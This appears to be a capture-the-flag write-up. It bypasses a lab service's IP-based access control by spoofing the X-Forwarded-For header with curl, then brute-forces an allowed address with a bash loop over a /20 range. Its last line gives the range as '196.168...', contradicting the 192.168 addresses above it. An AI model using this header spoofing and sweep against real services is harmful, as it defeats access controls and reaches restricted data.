## Component replacement [3 pts]

We're told that we're looking for `fuel efficiency enhancer` at http://key-parts-list.cns-jv.tcc/ and that the old IP range was 192.168.96.0/20.

Querying the URL will tell us that it's expecting an IP from engine room: `You are attempting to access from the IP address 10.200.0.41, which is not assigned to engine room. Access denied. `

So we have to 1) find out how to spoof the source IP address and 2) find out an IP from engine room.

For #1 quick google search yields `X-Forwarded-For` header which works:
`curl -H 'x-forwarded-for: 192.168.96.10' http://key-parts-list.cns-jv.tcc/` -> `You are attempting to access from the IP address 192.168.96.10, which is not assigned to engine room. Access denied.`

For #2 let's just run through the whole range and store results:
`for x in {96..127}; do for y in {0..255}; do echo "$x.$y"; curl -H "x-forwarded-for: 192.168.$x.$y" http://key-parts-list.cns-jv.tcc/ 2>/dev/null > "r_${x}_${y}"; done; done`

and then search for the part needed:

`grep -ri 'fuel efficiency enhancer'`
 ->
 `Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz}`

(Engine room IPs are 192.168.100.32-> 192.168.100.63, i.e.  196.168.100.32/27)
